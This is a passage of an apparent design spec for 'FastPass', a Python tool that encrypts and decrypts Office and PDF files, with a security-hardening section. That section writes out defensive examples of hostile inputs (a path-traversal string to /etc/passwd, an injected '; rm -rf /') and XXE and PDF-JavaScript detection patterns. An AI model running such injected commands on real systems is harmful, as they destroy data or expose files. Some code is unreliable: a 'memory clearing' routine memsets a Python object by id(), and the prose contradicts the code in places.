    SECURE_FILE_PERMISSIONS = 0o600
    SUPPORTED_FORMATS = {
        '.docx': 'msoffcrypto',
        '.xlsx': 'msoffcrypto', 
        '.pptx': 'msoffcrypto',
        '.docm': 'msoffcrypto',
        '.xlsm': 'msoffcrypto',
        '.pptm': 'msoffcrypto',
        '.dotx': 'msoffcrypto',
        '.xltx': 'msoffcrypto',
        '.potx': 'msoffcrypto',
        '.pdf': 'PyPDF2'
    }
    
    # Configuration file locations (in order of precedence)
    CONFIG_LOCATIONS = [
        Path.home() / '.fastpass' / 'config.json',  # User config
        Path.cwd() / 'fastpass.json',               # Project config
        Path(__file__).parent / 'config.json'      # Default config
    ]
    
    @classmethod
    def load_configuration(cls, cli_args: argparse.Namespace) -> Dict[str, Any]:
        """Load configuration from multiple sources with precedence"""
        config = cls._get_default_config()
        
        # 1. Load from config files (lowest precedence)
        for config_path in cls.CONFIG_LOCATIONS:
            if config_path.exists():
                try:
                    with open(config_path, 'r') as f:
                        file_config = json.load(f)
                        config.update(file_config)
                except (json.JSONDecodeError, IOError) as e:
                    print(f"Warning: Could not load config from {config_path}: {e}")
        
        # 2. Load from environment variables
        env_config = cls._load_from_environment()
        config.update(env_config)
        
        # 3. Override with CLI arguments (highest precedence)
        cli_config = cls._extract_cli_config(cli_args)
        config.update(cli_config)
        
        return config
    
    @classmethod
    def _get_default_config(cls) -> Dict[str, Any]:
        """Default configuration values"""
        return {
            'max_file_size': cls.MAX_FILE_SIZE,
            'temp_dir_prefix': cls.TEMP_DIR_PREFIX,
            'secure_permissions': cls.SECURE_FILE_PERMISSIONS,
            'supported_formats': cls.SUPPORTED_FORMATS.copy(),
            'log_level': 'INFO',
            'log_file': None,
            'cleanup_on_error': True,
            # Security hardening settings
            'allow_cwd': False,  # Default: do not allow current directory access
            'max_password_length': 1024,
            'max_json_size': 1024 * 1024,  # 1MB limit for password JSON
            'max_path_length': 4096,
            'enable_secure_deletion': True,
            'symlink_protection': True,
            'xml_entity_protection': True
        }
    
    @classmethod
    def _load_from_environment(cls) -> Dict[str, Any]:
        """Load configuration from environment variables"""
        import os
        config = {}
        
        # Environment variable mapping
        env_mapping = {
            'FASTPASS_MAX_FILE_SIZE': ('max_file_size', int),
            'FASTPASS_LOG_LEVEL': ('log_level', str),
            'FASTPASS_LOG_FILE': ('log_file', str),
            'FASTPASS_CLEANUP_ON_ERROR': ('cleanup_on_error', bool),
            # Security environment variables
            'FASTPASS_ALLOW_CWD': ('allow_cwd', bool),
            'FASTPASS_MAX_PASSWORD_LENGTH': ('max_password_length', int),
            'FASTPASS_MAX_JSON_SIZE': ('max_json_size', int),
            'FASTPASS_ENABLE_SECURE_DELETION': ('enable_secure_deletion', bool),
            'FASTPASS_SYMLINK_PROTECTION': ('symlink_protection', bool),
            'FASTPASS_XML_ENTITY_PROTECTION': ('xml_entity_protection', bool)
        }
        
        for env_var, (config_key, type_func) in env_mapping.items():
            if env_var in os.environ:
                try:
                    if type_func == bool:
                        config[config_key] = os.environ[env_var].lower() in ('true', '1', 'yes')
                    else:
                        config[config_key] = type_func(os.environ[env_var])
                except ValueError as e:
                    print(f"Warning: Invalid environment variable {env_var}: {e}")
        
        return config
    
    @classmethod
    def _extract_cli_config(cls, cli_args: argparse.Namespace) -> Dict[str, Any]:
        """Extract configuration from CLI arguments"""
        config = {}
        
        if hasattr(cli_args, 'debug') and cli_args.debug:
            config['log_level'] = 'DEBUG'
            
        if hasattr(cli_args, 'output_dir') and cli_args.output_dir:
            config['output_directory'] = cli_args.output_dir
        
        return config
    
# CUSTOM EXCEPTION CLASSES
class SecurityViolationError(Exception): pass
class FileFormatError(Exception): pass  
class CryptoToolError(Exception): pass
class ProcessingError(Exception): pass
```

---

## Section A: CLI Parsing & Initialization

> **CODE MAPPING CRITICAL**: Each element below corresponds to specific code blocks that must be labeled with the exact IDs shown (e.g., `# A1a: sys.argv processing`)

```python
# A1: COMMAND LINE ARGUMENT PARSING
def parse_command_line_arguments() -> argparse.Namespace:
    import sys
    import argparse
    from pathlib import Path
    from typing import List, Optional
    
    # A1a: Create argument parser with custom actions
    parser = argparse.ArgumentParser(
        prog='fast_pass',
        description='FastPass - Secure file encryption/decryption tool',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog='''
Examples:
  fast_pass encrypt -i file.docx -p mypassword
  fast_pass decrypt -i file.pdf --password-list passwords.txt
  fast_pass encrypt -i "file1.xlsx" "file2.xlsx" -o ./encrypted/
        '''
    )
    
    # A1b: Operation mode (encrypt XOR decrypt)
    operation_group = parser.add_mutually_exclusive_group(required=True)
    operation_group.add_argument('-e', '--encrypt', action='store_true',
                                help='Encrypt files')
    operation_group.add_argument('-d', '--decrypt', action='store_true', 
                                help='Decrypt files')
    
    # A1c: File input options (explicit file specification required)
    parser.add_argument('-i', '--input', nargs='*', type=str, dest='files',
                       help='Files to process (space-delimited, quotes for spaces)')
    parser.add_argument('-r', '--recursive', type=Path, metavar='DIR',
                       help='Process directory recursively (decrypt/check-password only)')
    
    # A1d: Password options with space-delimited support
    parser.add_argument('-p', '--password', nargs='*', type=str, dest='cli_passwords',
                       help='Passwords to try (space-delimited, quotes for spaces, or "stdin" for JSON input)')
    parser.add_argument('--password-list', type=Path,
                       help='File containing passwords (one per line)')
    
    # A1e: Output options  
    parser.add_argument('-o', '--output-dir', type=Path,
                       help='Output directory (default: in-place)')
    
    # A1f: Utility options
    parser.add_argument('--dry-run', action='store_true',
                       help='Show what would be done without making changes')
    parser.add_argument('--verify', action='store_true',
                       help='Deep verification of processed files')
    parser.add_argument('--list-supported', action='store_true',
                       help='List supported file formats')
    parser.add_argument('--debug', action='store_true',
                       help='Enable detailed logging')
    parser.add_argument('--log-file', type=Path,
                       help='Write logs to specified file')
    parser.add_argument('--report-format', choices=['text', 'json', 'csv'],
                       default='text', help='Output report format')
    
    # A1g: Security options
    parser.add_argument('--allowed-dirs', nargs='+', type=str,
                       help='Additional directories to allow for file access (default: home directory and current working directory)')
    parser.add_argument('-v', '--version', action='version',
                       version=f'FastPass {FastPassConfig.VERSION}')
    
    # A1h: Parse arguments with error handling
    try:
        args = parser.parse_args()
    except SystemExit as e:
        if e.code != 0:
            sys.exit(2)  # Invalid arguments
        raise
    
    # A1h: Handle special modes
    if args.list_supported:
        display_supported_formats()
        sys.exit(0)
    
    return args

# A2: ARGUMENT VALIDATION AND NORMALIZATION
def validate_operation_mode_and_arguments(args: argparse.Namespace) -> argparse.Namespace:
    from pathlib import Path
    
    # A2a: Ensure files or recursive specified
    if not args.files and not args.recursive:
        raise ValueError("Must specify files or --recursive directory")
    
    if args.files and args.recursive:
        raise ValueError("Cannot specify both files and --recursive")
    
    # A2a1: Restrict recursive mode to decrypt and check-password only
    if args.recursive and args.encrypt:
        raise ValueError("Recursive mode is only supported for decrypt operations (security restriction)")
    
    # A2b: Process explicit file paths and normalize (no glob pattern support)
    if args.files:
        # Convert to Path objects and resolve (explicit file specification only)
        args.files = [Path(f).expanduser().resolve() for f in args.files]
    
    if args.recursive:
        args.recursive = Path(args.recursive).expanduser().resolve()
        if not args.recursive.is_dir():
            raise ValueError(f"Recursive path is not a directory: {args.recursive}")
    
    # A2c: Validate output directory
    if args.output_dir:
        args.output_dir = Path(args.output_dir).expanduser().resolve()
        if args.output_dir.exists() and not args.output_dir.is_dir():
            raise ValueError(f"Output path exists but is not a directory: {args.output_dir}")
    
    # A2d: Set operation mode flag
    args.operation = 'encrypt' if args.encrypt else 'decrypt'
    
    return args

# A3: LOGGING SYSTEM INITIALIZATION
def setup_logging_and_debug_infrastructure(args: argparse.Namespace) -> logging.Logger:
    import logging
    import sys
    from datetime import datetime
    
    # A3a: Configure logging with TTY detection
    log_level = logging.DEBUG if args.debug else logging.INFO
    
    # A3a-1: Configure console logging
    console_handler = logging.StreamHandler(sys.stderr)
    
    # Check if stderr is a TTY for appropriate formatting
    if sys.stderr.isatty():
        console_format = '%(asctime)s - %(levelname)s - %(message)s'
    else:
        # Non-TTY output (e.g., redirected to file) - simpler format
        console_format = '%(levelname)s: %(message)s'
    
    console_handler.setFormatter(logging.Formatter(console_format))
    console_handler.setLevel(log_level)
    
    # A3a-2: Configure file logging if specified
    handlers = [console_handler]
    
    if hasattr(args, 'log_file') and args.log_file:
        try:
            # Ensure log directory exists
            args.log_file.parent.mkdir(parents=True, exist_ok=True)
            
            file_handler = logging.FileHandler(args.log_file, mode='a')
            file_format = '%(asctime)s - %(name)s - %(levelname)s - %(message)s'
            file_handler.setFormatter(logging.Formatter(file_format))
            file_handler.setLevel(logging.DEBUG)  # Always debug level for files
            handlers.append(file_handler)
            
        except Exception as e:
            print(f"Warning: Could not set up file logging to {args.log_file}: {e}")
    
    # A3a-3: Configure root logger
    logger = logging.getLogger('fastpass')
    logger.setLevel(log_level)
    logger.handlers.clear()  # Remove any existing handlers
    
    for handler in handlers:
        logger.addHandler(handler)
    
    logger = logging.getLogger('fastpass')
    
    # A3b: Log startup
    logger.info(f"FastPass v{FastPassConfig.VERSION} starting - operation: {args.operation}")
    
    return logger

def handle_password_input_sources(args: argparse.Namespace) -> None:
    """A3c: Handle TTY detection and stdin password input"""
    import sys
    import json
    
    # Check if 'stdin' is specified in CLI passwords
    if args.cli_passwords and 'stdin' in args.cli_passwords:
        if sys.stdin.isatty():
            raise ValueError("Cannot read JSON from stdin: terminal input detected")
        
        try:
            # Read JSON password mapping from stdin
            stdin_data = sys.stdin.read()
            password_mapping = json.loads(stdin_data)
            
            # Remove 'stdin' from CLI passwords and store mapping
            args.cli_passwords.remove('stdin')
            args.stdin_password_mapping = password_mapping
            
        except json.JSONDecodeError as e:
            raise ValueError(f"Invalid JSON in stdin password input: {e}")
        except Exception as e:
            raise ValueError(f"Error reading password input from stdin: {e}")
    else:
        args.stdin_password_mapping = {}

# A4: CRYPTO TOOL AVAILABILITY DETECTION
def initialize_crypto_tool_detection() -> Dict[str, bool]:
    import subprocess
    import importlib
    
    crypto_tools = {}
    
    # A4a: Test msoffcrypto-tool availability
    try:
        result = subprocess.run(['python', '-m', 'msoffcrypto.cli', '--version'], 
                              capture_output=True, timeout=10)
        crypto_tools['msoffcrypto'] = result.returncode == 0
    except (subprocess.TimeoutExpired, FileNotFoundError):
        crypto_tools['msoffcrypto'] = False
    
    # A4b: Test PyPDF2 availability
    try:
        importlib.import_module('PyPDF2')
        crypto_tools['PyPDF2'] = True
    except ImportError:
        crypto_tools['PyPDF2'] = False
    
    # A4c: Check for missing required tools
    required_tools = []
    if not crypto_tools.get('msoffcrypto'):
        required_tools.append('msoffcrypto-tool')
    if not crypto_tools.get('PyPDF2'):
        required_tools.append('PyPDF2')
    
    if required_tools:
        raise CryptoToolError(f"Missing required tools: {', '.join(required_tools)}")
    
    return crypto_tools

# A5: FASTPASS APPLICATION CLASS
class FastPassApplication:
    def __init__(self, args: argparse.Namespace, logger: logging.Logger):
        # A5a: Initialize instance variables
        self.args = args
        self.logger = logger
        self.operation_mode = args.operation
        self.crypto_tools = initialize_crypto_tool_detection()
        
        # A5b: File tracking lists
        self.temp_files_created: List[Path] = []
        self.processing_results: Dict[Path, str] = {}
        self.operation_start_time = datetime.now()
        
        # A5c: Load configuration and initialize secure password manager
        self.config = FastPassConfig.load_configuration(args)
        self.password_manager = SecurePasswordManager()
        self.password_manager.load_password_sources(args)
        
        # A5d: Initialize secure temporary file manager
        self.temp_file_manager = SecureTempFileManager()
        
        # A5e: State flags
        self.ready_for_processing = True
        
        self.logger.debug("FastPass application initialized successfully")
```

**What's Actually Happening:**
- **A1: Command Line Argument Processing**
  - `sys.argv` processing with explicit file specification
  - Individual file paths specified directly: `fast_pass encrypt "file1.docx" "file2.pdf"`
  - Quoted paths for files with spaces: `fast_pass encrypt "my documents/file.txt"`
  - `args.operation` contains 'encrypt' or 'decrypt' as positional argument
  - `args.files` becomes list of explicitly specified file paths
  - `args.cli_passwords` contains space-delimited passwords from -p flag
  - `args.stdin_password_mapping` contains JSON password mapping if '-p stdin' used

- **A2: Operation Mode & File Path Validation**
  - Validate operation: `args.operation` must be 'encrypt' or 'decrypt'
  - Input validation: must have `args.files` or `args.recursive` (not both unless combining)
  - File existence check: `os.path.exists(file_path)` for each input file or directory
  - Path normalization: `os.path.abspath(os.path.expanduser(file_path))`
  - Per-file password pairing: associate each file with its -p password argument
  - Password source validation: ensure passwords available from CLI, list file, or stdin
  - Build file list: `self.input_files = [{'path': Path, 'password': str, 'source': str}]`
  - Special modes: `--check-password`, `--list-supported` bypass normal password requirements

- **A3: Logging System Configuration with TTY Detection**
  - `sys.stderr.isatty()` detection for appropriate log formatting
  - TTY output: Full timestamp format `'%(asctime)s - %(levelname)s - %(message)s'`
  - Non-TTY output: Simple format `'%(levelname)s: %(message)s'` for file redirection
  - `logging.basicConfig()` with `level=logging.DEBUG` if `args.debug` enabled
  - Handler: `sys.stderr` for console output, doesn't interfere with stdout
  - Password input validation: Check `sys.stdin.isatty()` when '-p stdin' specified
  - JSON password parsing: Parse stdin JSON for per-file password mapping
  - TTY safety: Prevent accidental password exposure in terminal input

- **A4: Crypto Library Availability Detection**
  - Test msoffcrypto-tool: `import msoffcrypto` with ImportError handling
  - Test PyPDF2: `import PyPDF2` with version compatibility check
  - Store availability: `self.crypto_tools = {'msoffcrypto': bool, 'pypdf2': bool}`
  - If required libraries missing: exit with helpful installation instructions

- **A5: Configuration & Default Setup**
  - `self.config = {'backup_suffix': '_backup_{timestamp}', 'temp_dir_prefix': 'FastPass_'}`
  - `self.config['secure_permissions'] = 0o600` (read/write owner only)
  - `self.config['max_file_size'] = 500 * 1024 * 1024` (500MB limit)
  - `self.config['supported_formats'] = {'.docx': 'msoffcrypto', '.pdf': 'pypdf2'}`
  - Password policy: `self.config['min_password_length'] = 1` (no minimum enforced)
  - Cleanup settings: `self.config['cleanup_on_error'] = True`

- **A6: FastPass Application Object Creation**
  - Main `FastPass(args)` object instantiated with parsed arguments
  - `self.operation_mode = args.operation` ('encrypt' or 'decrypt')
  - `self.password_manager = PasswordManager()`
  - `self.file_processors = {}` (will map files to appropriate crypto handlers)
  - `self.temp_files_created = []` (tracking for cleanup)
  - `self.operation_start_time = datetime.now()` for timing
  - State flags: `self.ready_for_processing = True`, `self.cleanup_required = False`

---

## Security Hardening & Attack Vector Mitigation

> **SECURITY CRITICAL**: This section addresses comprehensive security hardening based on threat analysis and attack vector identification. Every mitigation must be implemented exactly as specified to prevent exploitation.

### **Attack Vector Analysis & Mitigations**

#### **1. Path Traversal Attack Prevention**

**Attack Scenario**: Attacker uses paths like `../../../../etc/passwd` to access files outside allowed directories.

**Hardened Validation**:
```python
def validate_path_security_hardened(file_path: Path, explicit_allow_cwd: bool = False) -> None:
    """Enhanced path traversal protection with strict validation"""
    import os
    from pathlib import Path
    
    # B1-SEC-1: Canonical path resolution with symlink detection
    try:
        original_path = file_path
        resolved_path = file_path.resolve(strict=True)  # Fail if path doesn't exist
        
        # B1-SEC-2: Symlink detection and protection
        if resolved_path != original_path.resolve():
            if original_path.is_symlink() or any(p.is_symlink() for p in original_path.parents):
                raise SecurityViolationError("Symlink access denied for security")
        
        # B1-SEC-3: Restricted allowed directories (NO current directory by default)
        allowed_dirs = [Path.home().resolve()]
        
        # Only allow current directory if explicitly enabled
        if explicit_allow_cwd:
            allowed_dirs.append(Path.cwd().resolve())
        
        # B1-SEC-4: Strict containment checking
        is_allowed = False
        for base_dir in allowed_dirs:
            try:
                relative_path = resolved_path.relative_to(base_dir)
                # Additional check: no parent directory references in resolved path
                if '..' in str(relative_path):
                    raise SecurityViolationError("Path traversal in resolved path")
                is_allowed = True
                break
            except ValueError:
                continue
        
        if not is_allowed:
            raise SecurityViolationError("File access outside permitted directories")
            
        # B1-SEC-5: Path component analysis (enhanced)
        forbidden_components = ['..', '.', '', '~']
        for component in original_path.parts:
            if component in forbidden_components:
                raise SecurityViolationError(f"Forbidden path component: {component}")
            if component.startswith('.') and component not in ['.docx', '.xlsx', '.pptx', '.pdf']:
                raise SecurityViolationError("Hidden file/directory access denied")
            
        # B1-SEC-6: Path length and character validation
        if len(str(resolved_path)) > 4096:  # Reasonable path length limit
            raise SecurityViolationError("Path length exceeds security limit")
            
        # Check for null bytes and other dangerous characters
        dangerous_chars = ['\x00', '\n', '\r', '\t']
        if any(char in str(original_path) for char in dangerous_chars):
            raise SecurityViolationError("Dangerous characters in file path")
            
    except (OSError, FileNotFoundError) as e:
        raise SecurityViolationError(f"Invalid or inaccessible file path: {e}")
```

#### **2. Command Injection Prevention**

**Attack Scenario**: Malicious file paths with shell metacharacters like `; rm -rf /` injected into subprocess calls.

**Secure Implementation**:
```python
def encrypt_file_secure(self, input_path: Path, output_path: Path, password: str) -> None:
    """Secure Office encryption using direct library calls (no subprocess)"""
    
    # B2-SEC-1: Legacy format validation
    file_extension = input_path.suffix.lower()
    if file_extension in ['.doc', '.xls', '.ppt']:
        raise FileFormatError(f"Legacy Office format {file_extension} not supported")
    
    # B2-SEC-2: Path validation before processing
    validate_path_security_hardened(input_path)
    validate_path_security_hardened(output_path.parent)
    
    # B2-SEC-3: Password sanitization
    if len(password) > 1024:  # Reasonable password length limit
        raise ValueError("Password exceeds maximum length")
    if '\x00' in password:
        raise ValueError("Null byte in password")
    
    # B2-SEC-4: Use direct library calls instead of subprocess
    try:
        import msoffcrypto
        
        # Use msoffcrypto library directly for encryption (when available)
        # This eliminates subprocess command injection risks
        with open(input_path, 'rb') as input_file:
            # Note: Direct encryption may require different approach
            # Fall back to subprocess with strict argument validation only if necessary
            if self._direct_encryption_available():
                self._encrypt_direct(input_file, output_path, password)
            else:
                self._encrypt_subprocess_secure(input_path, output_path, password)
                
    except Exception as e:
        raise ProcessingError(f"Secure Office encryption failed: {e}")

def _encrypt_subprocess_secure(self, input_path: Path, output_path: Path, password: str) -> None:
    """Fallback secure subprocess implementation with strict validation"""
    
    # B2-SEC-5: Strict argument validation for subprocess
    import subprocess
    import shlex
    
    # Validate all paths are within allowed directories
    validate_path_security_hardened(input_path)
    validate_path_security_hardened(output_path.parent)
    
    # Use argument list (not shell) to prevent injection
    cmd_args = [
        'python', '-m', 'msoffcrypto.cli',
        '-e', '-p', password,
        str(input_path.resolve()),  # Use absolute paths
        str(output_path.resolve())
    ]
    
    # B2-SEC-6: Secure subprocess execution
    try:
        result = subprocess.run(
            cmd_args,
            capture_output=True,
            text=True,
            timeout=60,
            shell=False,  # CRITICAL: Never use shell=True
            cwd=None,     # Don't inherit current directory
            env={'PATH': os.environ.get('PATH', '')},  # Minimal environment
            check=False
        )
        
        if result.returncode != 0:
            # Sanitize error output to prevent information disclosure
            sanitized_error = self._sanitize_error_message(result.stderr)
            raise ProcessingError(f"Office encryption failed: {sanitized_error}")
            
    except subprocess.TimeoutExpired:
        raise ProcessingError("Office encryption timed out")
```

#### **3. Password Security & Memory Protection**

**Attack Scenarios**: Password exposure in process lists, memory dumps, swap files, or shell history.

**Secure Implementation**:
```python
class SecurePasswordManager:
    """Enhanced password manager with memory protection"""
    
    def __init__(self):
        self.cli_passwords = []
        self.password_list_file = None
        self.password_list = []
        self._memory_regions = []  # Track memory for secure clearing
        
    # B3-SEC-1: Secure password input without command line exposure
    def get_password_secure(self, prompt: str = "Password: ") -> str:
        """Get password without exposing in process list or history"""
        import getpass
        import sys
        
        if sys.stdin.isatty():
            # Interactive mode - use secure password prompt
            password = getpass.getpass(prompt)
        else:
            # Non-interactive mode - read from stdin (for automation)
            password = sys.stdin.readline().rstrip('\n\r')
        
        if not password:
            raise ValueError("Empty password not allowed")
            
        return password
    
    # B3-SEC-2: Secure memory clearing for passwords
    def clear_password_memory(self, password_str: str) -> None:
        """Attempt to clear password from memory (best effort)"""
        import ctypes
        
        try:
            # Get string object memory location
            address = id(password_str)
            size = len(password_str)
            
            # Overwrite memory with zeros (best effort in Python)
            ctypes.memset(address, 0, size)
            
        except Exception:
            # Memory clearing is best effort - don't fail operation
            pass
    
    # B3-SEC-3: Secure JSON password parsing with validation
    def parse_stdin_passwords_secure(self, stdin_data: str) -> Dict[str, str]:
        """Secure JSON password parsing with strict validation"""
        import json
        
        # Validate JSON size to prevent DoS
        if len(stdin_data) > 1024 * 1024:  # 1MB limit
            raise ValueError("Password JSON exceeds size limit")
        
        try:
            password_mapping = json.loads(stdin_data)
            
            if not isinstance(password_mapping, dict):
                raise ValueError("Password input must be JSON object")
            
            # Validate each entry
            validated_mapping = {}
            for filename, password in password_mapping.items():
                if not isinstance(filename, str) or not isinstance(password, str):
                    raise ValueError("Password mapping must contain only strings")
                
                # Validate filename for security
                file_path = Path(filename)
                validate_path_security_hardened(file_path)
                
                # Validate password
                if len(password) > 1024:
                    raise ValueError(f"Password for {filename} exceeds length limit")
                if '\x00' in password:
                    raise ValueError(f"Invalid characters in password for {filename}")
                
                validated_mapping[filename] = password
            
            return validated_mapping
            
        except json.JSONDecodeError as e:
            raise ValueError(f"Invalid JSON in password input: {e}")
        finally:
            # Clear input data from memory
            self.clear_password_memory(stdin_data)
```

#### **4. Secure Temporary File Operations**

**Attack Scenarios**: Race conditions, symlink attacks, predictable file names, insecure permissions.

**Secure Implementation**:
```python
class SecureTempFileManager:
    """Enhanced temporary file manager with security hardening"""
    
    def __init__(self):
        self.temp_directories = []
        self.temp_files = []
        self.cleanup_registered = False
        
    # B4-SEC-1: Secure temporary directory creation
    def create_secure_temp_directory(self) -> Path:
        """Create cryptographically secure temporary directory"""
        import tempfile
        import secrets
        import os
        from datetime import datetime
        
        # B4-SEC-2: Cryptographically secure random naming
        random_suffix = secrets.token_hex(16)  # 32 character hex string
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        pid = os.getpid()
        
        # Combine multiple entropy sources
        temp_name = f"fastpass_sec_{timestamp}_{pid}_{random_suffix}"
        
        # B4-SEC-3: Create with most restrictive permissions
        old_umask = os.umask(0o077)  # Ensure only owner can access
        try:
            temp_dir = Path(tempfile.mkdtemp(prefix=temp_name))
            
            # Set extremely restrictive permissions
            os.chmod(temp_dir, 0o700)  # Owner read/write/execute only
            
            # Create subdirectories with same restrictive permissions
            for subdir in ['processing', 'output']:
                subdir_path = temp_dir / subdir
                subdir_path.mkdir(mode=0o700)
                
            self.temp_directories.append(temp_dir)
            
            # Register cleanup if not already done
            if not self.cleanup_registered:
                import atexit
                atexit.register(self.emergency_cleanup)
                self.cleanup_registered = True
                
            return temp_dir
            
        finally:
            os.umask(old_umask)  # Restore original umask
    
    # B4-SEC-4: Secure atomic file operations
    def atomic_file_write(self, content: bytes, target_path: Path) -> None:
        """Secure atomic file write to prevent race conditions"""
        import secrets
        import os
        
        # Create temporary file in same directory as target (for atomic move)
        temp_name = f".tmp_{secrets.token_hex(8)}_{target_path.name}"
        temp_path = target_path.parent / temp_name
        
        try:
            # Write to temporary file with secure permissions
            with open(temp_path, 'wb') as f:
                os.chmod(temp_path, 0o600)  # Restrictive permissions before writing
                f.write(content)
                f.flush()
                os.fsync(f.fileno())  # Ensure data is written to disk
            
            # Atomic move to final location
            temp_path.replace(target_path)
            
        except Exception:
            # Clean up temporary file on failure
            if temp_path.exists():
                try:
                    temp_path.unlink()
                except Exception:
                    pass
            raise
    
    # B4-SEC-5: Secure file deletion with overwriting
    def secure_delete_file(self, file_path: Path) -> None:
        """Securely delete file with overwriting (best effort)"""
        import os
        
        try:
            if file_path.exists() and file_path.is_file():
                file_size = file_path.stat().st_size
                
                # Overwrite with random data (best effort)
                if file_size > 0 and file_size < 100 * 1024 * 1024:  # Only for files < 100MB
                    with open(file_path, 'r+b') as f:
                        # Multiple passes with different patterns
                        patterns = [b'\x00', b'\xFF', secrets.token_bytes(min(file_size, 1024))]
                        for pattern in patterns:
                            f.seek(0)
                            if len(pattern) == 1:
                                f.write(pattern * file_size)
                            else:
                                # Write random pattern
                                remaining = file_size
                                while remaining > 0:
                                    chunk_size = min(remaining, len(pattern))
                                    f.write(pattern[:chunk_size])
                                    remaining -= chunk_size
                            f.flush()
                            os.fsync(f.fileno())
                
                # Remove file
                file_path.unlink()
                
        except Exception:
            # Don't fail operation if secure deletion fails
            try:
                file_path.unlink()  # Fallback to normal deletion
            except Exception:
                pass
```

#### **5. File Format Attack Prevention**

**Attack Scenarios**: XXE injection, ZIP bombs, malicious macros, polyglot files.

**Secure Implementation**:
```python
def validate_file_format_secure(file_path: Path) -> str:
    """Enhanced file format validation with attack prevention"""
    import filetype
    import zipfile
    import xml.etree.ElementTree as ET
    
    # B5-SEC-1: File size validation (prevent DoS)
    file_size = file_path.stat().st_size
    if file_size > FastPassConfig.MAX_FILE_SIZE:
        raise FileFormatError(f"File too large: {file_size} bytes")
    if file_size == 0:
        raise FileFormatError("Empty file not allowed")
    
    # B5-SEC-2: Magic number validation (primary authority)
    detected_type = filetype.guess(str(file_path))
    file_extension = file_path.suffix.lower()
    
    # Allowed magic number mappings
    allowed_magic_types = {
        'application/vnd.openxmlformats-officedocument.wordprocessingml.document': '.docx',
        'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet': '.xlsx',
        'application/vnd.openxmlformats-officedocument.presentationml.presentation': '.pptx',
        'application/pdf': '.pdf'
    }
    
    detected_format = None
    if detected_type and detected_type.mime in allowed_magic_types:
        detected_format = allowed_magic_types[detected_type.mime]
        
        # B5-SEC-3: Cross-validate magic number vs extension
        if file_extension != detected_format:
            raise FileFormatError(f"File format mismatch: extension {file_extension} vs detected {detected_format}")
    
    # B5-SEC-4: Extension-based validation (fallback)
    if not detected_format:
        if file_extension in FastPassConfig.SUPPORTED_FORMATS:
            detected_format = file_extension
        else:
            raise FileFormatError(f"Unsupported file format: {file_extension}")
    
    # B5-SEC-5: Office document security validation
    if detected_format in ['.docx', '.xlsx', '.pptx']:
        validate_office_document_security(file_path)
    
    # B5-SEC-6: PDF security validation  
    elif detected_format == '.pdf':
        validate_pdf_document_security(file_path)
    
    return detected_format

def validate_office_document_security(file_path: Path) -> None:
    """Validate Office document against security threats"""
    import zipfile
    import xml.etree.ElementTree as ET
    
    try:
        # B5-SEC-7: ZIP bomb protection
        with zipfile.ZipFile(file_path, 'r') as zip_file:
            total_uncompressed = 0
            file_count = 0
            
            for info in zip_file.infolist():
                file_count += 1
                total_uncompressed += info.file_size
                
                # Prevent ZIP bombs
                if file_count > 1000:  # Reasonable file count limit
                    raise FileFormatError("Office document contains too many files")
                
                if total_uncompressed > 100 * 1024 * 1024:  # 100MB uncompressed limit
                    raise FileFormatError("Office document uncompressed size too large")
                
                # Check compression ratio for ZIP bomb detection
                if info.file_size > 0 and info.compress_size > 0:
                    ratio = info.file_size / info.compress_size
                    if ratio > 100:  # High compression ratio indicates potential ZIP bomb
                        raise FileFormatError("Suspicious compression ratio in Office document")
            
            # B5-SEC-8: XML content validation (prevent XXE)
            xml_files = [name for name in zip_file.namelist() if name.endswith('.xml')]
            for xml_file in xml_files[:10]:  # Limit XML files checked
                try:
                    with zip_file.open(xml_file) as f:
                        xml_content = f.read(1024 * 1024)  # Limit XML size read
                        validate_xml_security(xml_content)
                except Exception:
                    # Don't fail on XML parsing errors, but log suspicion
                    continue
                    
    except zipfile.BadZipFile:
        raise FileFormatError("Corrupted Office document")

def validate_xml_security(xml_content: bytes) -> None:
    """Validate XML content for security threats"""
    
    # B5-SEC-9: XXE prevention - check for entity declarations
    xml_str = xml_content.decode('utf-8', errors='ignore')
    
    # Look for suspicious patterns
    suspicious_patterns = [
        '<!ENTITY',     # Entity declarations
        'SYSTEM',       # System entity references
        'file://',      # File protocol
        'http://',      # HTTP requests in XML
        'https://',     # HTTPS requests in XML
        '&lt;!ENTITY', # HTML-encoded entity declarations
    ]
    
    xml_lower = xml_str.lower()
    for pattern in suspicious_patterns:
        if pattern.lower() in xml_lower:
            raise FileFormatError("Potentially malicious XML content detected")
    
    # Additional size check
    if len(xml_content) > 10 * 1024 * 1024:  # 10MB XML limit
        raise FileFormatError("XML content too large")

def validate_pdf_document_security(file_path: Path) -> None:
    """Validate PDF document against security threats"""
    
    # B5-SEC-10: Basic PDF structure validation
    with open(file_path, 'rb') as f:
        header = f.read(1024)
        
        # Check PDF header
        if not header.startswith(b'%PDF-'):
            raise FileFormatError("Invalid PDF header")
        
        # Look for suspicious content
        suspicious_content = [
            b'/JavaScript',  # JavaScript in PDF
            b'/JS',         # JavaScript abbreviation
            b'/Launch',     # Launch actions
            b'/GoToR',      # Go to remote actions
        ]
        
        content_sample = f.read(10 * 1024)  # Read first 10KB for scanning
        for suspicious in suspicious_content:
            if suspicious in content_sample:
                raise FileFormatError("Potentially malicious PDF content detected")
```

---

## Section B: Security & File Validation

> **SECURITY CRITICAL**: Every security check must map to specific code with proper error handling and sanitization. Label each implementation block with the exact ID shown.

```python
# B1: FILE PATH RESOLUTION AND SECURITY VALIDATION
def perform_security_and_file_validation(args: argparse.Namespace) -> List[FileManifest]:
    import os
    import filetype
    from pathlib import Path
    from typing import List, Dict, Any
    
    validated_files: List[FileManifest] = []
    
    # B1a: Collect all files to process
    files_to_process = []
    if args.files:
        files_to_process = args.files
    elif args.recursive:
        files_to_process = collect_files_recursively(args.recursive)
    
    for file_path in files_to_process:
        # B1b: Path resolution and normalization
        resolved_path = Path(file_path).expanduser().resolve()
        
        # B1c: Security validation - hardened path traversal protection
        validate_path_security_hardened(resolved_path, explicit_allow_cwd=args.allow_cwd)
        
        # B1d: File existence and access validation
        validate_file_access(resolved_path)
        
        # B1e: File format validation with security hardening
        file_format = validate_file_format_secure(resolved_path)
        
        # B1f: Encryption status detection
        encryption_status = detect_encryption_status(resolved_path, file_format)
        
        # B1g: Build file manifest entry
        manifest_entry = FileManifest(
            path=resolved_path,
            format=file_format,
            size=resolved_path.stat().st_size,
            is_encrypted=encryption_status,
            crypto_tool=FastPassConfig.SUPPORTED_FORMATS[file_format.suffix]
